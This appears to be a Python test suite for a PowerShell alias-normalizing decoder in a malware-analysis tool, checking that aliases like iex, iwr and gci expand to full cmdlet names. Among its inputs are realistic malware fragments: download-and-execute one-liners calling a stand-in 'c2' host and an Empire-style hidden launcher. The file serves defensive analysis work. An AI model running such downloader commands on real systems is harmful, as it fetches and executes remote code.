"""RC4.5 · PowerShell Alias Normalizer regression suite.

Golden fixtures cover:
    * Common aliases (iex, gci, iwr, irm, icm, gcm, ni, sv, gv, ps, kill)
    * Command-position enforcement (alias inside a string literal must
      NOT be rewritten)
    * Case-insensitive matching (IEX, Iex, iex all normalize)
    * Multi-alias in one line
    * Aliases separated by pipes / semicolons / ampersands
    * No-op inputs (no alias present, or alias that isn't a real PS alias)
    * @op banner rendering
    * BaseDecoder detect() confidence
    * Realistic malware fragments
"""
from __future__ import annotations
import sys
sys.path.insert(0, "/app/backend")

from operations import run_operation
from decoders import ps_alias_normalizer as psa


# ── Common aliases ────────────────────────────────────────────────
def test_iex_expands():
    out, trace = psa.normalize_aliases("iex 'Get-Process'")
    assert out == "Invoke-Expression 'Get-Process'"
    assert any(r["detail"].startswith("'iex'") for r in trace)


def test_gci_expands():
    out, _ = psa.normalize_aliases("gci C:\\Windows")
    assert out == "Get-ChildItem C:\\Windows"


def test_iwr_expands():
    out, _ = psa.normalize_aliases("iwr https://c2/x")
    assert out == "Invoke-WebRequest https://c2/x"


def test_irm_expands():
    out, _ = psa.normalize_aliases("irm https://c2/x | iex")
    assert out == "Invoke-RestMethod https://c2/x | Invoke-Expression"


def test_icm_expands():
    out, _ = psa.normalize_aliases("icm -ComputerName srv -ScriptBlock {gci}")
    assert out == "Invoke-Command -ComputerName srv -ScriptBlock {Get-ChildItem}"


def test_ni_expands():
    out, _ = psa.normalize_aliases("ni file.txt")
    assert out == "New-Item file.txt"


def test_ps_expands_to_get_process():
    out, _ = psa.normalize_aliases("ps | ? {$_.Name -eq 'x'}")
    assert out == "Get-Process | Where-Object {$_.Name -eq 'x'}"


def test_gcm_expands():
    out, _ = psa.normalize_aliases("gcm net")
    assert out == "Get-Command net"


# ── Case-insensitive ──────────────────────────────────────────────
def test_case_insensitive_iex():
    for variant in ["iex", "IEX", "Iex", "iEx"]:
        out, _ = psa.normalize_aliases(f"{variant} 'x'")
        assert out == "Invoke-Expression 'x'", f"Failed on {variant}"


# ── Command-position enforcement ──────────────────────────────────
def test_alias_inside_string_literal_preserved():
    out, _ = psa.normalize_aliases("Write-Host 'use iex to run'")
    assert out == "Write-Host 'use iex to run'"


def test_alias_inside_double_quoted_string_IS_normalized():
    """Double-quoted PS strings are executable payloads (-Command "..."),
    so aliases inside them MUST be expanded — this is the whole point of
    the normalizer for downloaders like `iex (iwr 'x')`."""
    out, _ = psa.normalize_aliases('Write-Host "gci C:\\"')
    assert 'Get-ChildItem' in out


def test_word_boundary_not_matched_inside_identifier():
    # 'gci' inside 'legcity' must NOT be rewritten.
    out, _ = psa.normalize_aliases("$legcity = 1")
    assert out == "$legcity = 1"


# ── Multi-alias / pipeline / separator ────────────────────────────
def test_multi_alias_pipeline():
    out, _ = psa.normalize_aliases("gci | ? {$_.Name} | select Name | sort")
    assert out == "Get-ChildItem | Where-Object {$_.Name} | Select-Object Name | Sort-Object"


def test_semicolon_separated_aliases():
    out, _ = psa.normalize_aliases("cd C:\\; gci; iex 'x'")
    assert out == "Set-Location C:\\; Get-ChildItem; Invoke-Expression 'x'"


def test_ampersand_separated():
    out, _ = psa.normalize_aliases("gci & iex 'x'")
    assert out == "Get-ChildItem & Invoke-Expression 'x'"


# ── Realistic malware fragments ───────────────────────────────────
def test_downloader_iwr_iex_chain():
    out, _ = psa.normalize_aliases(
        "powershell -NoProfile -Command \"iex (iwr 'http://c2/s.ps1')\""
    )
    assert "Invoke-Expression" in out
    assert "Invoke-WebRequest" in out


def test_empire_style_launcher():
    src = "powershell -w hidden -nop -c \"iex (gc c:\\temp\\p.ps1)\""
    out, _ = psa.normalize_aliases(src)
    assert "Invoke-Expression (Get-Content c:\\temp\\p.ps1)" in out


# ── No-op cases ───────────────────────────────────────────────────
def test_no_aliases_returns_unchanged():
    out, trace = psa.normalize_aliases("Get-Process | Sort-Object CPU")
    assert out == "Get-Process | Sort-Object CPU"
    assert trace == []


def test_non_powershell_text_returns_unchanged():
    # No alias tokens at command position — `ls` and `dir` aren't standalone
    # tokens here.
    out, _ = psa.normalize_aliases("total 42\ndrwx-r-xr-x file.txt")
    assert out == "total 42\ndrwx-r-xr-x file.txt"


# ── @op banner ────────────────────────────────────────────────────
def test_op_banner_on_alias_input():
    banner = run_operation("powershell-alias-normalize", "iex 'x'", {})
    assert "POWERSHELL ALIAS NORMALIZATION" in banner
    assert "Invoke-Expression" in banner


def test_op_banner_on_clean_input():
    banner = run_operation(
        "powershell-alias-normalize", "Get-Process | Sort-Object CPU", {},
    )
    assert banner.startswith("(powershell-alias-normalize")


# ── BaseDecoder ───────────────────────────────────────────────────
def test_basedecoder_detect_fires():
    from engine.models import AnalysisContext, Fingerprint
    fp = Fingerprint(input_len=10)
    ctx = AnalysisContext()
    r = psa.PSAliasNormalizerDecoder().detect("iex 'x'", fp, ctx)
    assert r.confidence >= 0.80


def test_basedecoder_detect_ignores_no_alias():
    from engine.models import AnalysisContext, Fingerprint
    fp = Fingerprint(input_len=10)
    ctx = AnalysisContext()
    r = psa.PSAliasNormalizerDecoder().detect("Get-Process", fp, ctx)
    assert r.confidence == 0.0
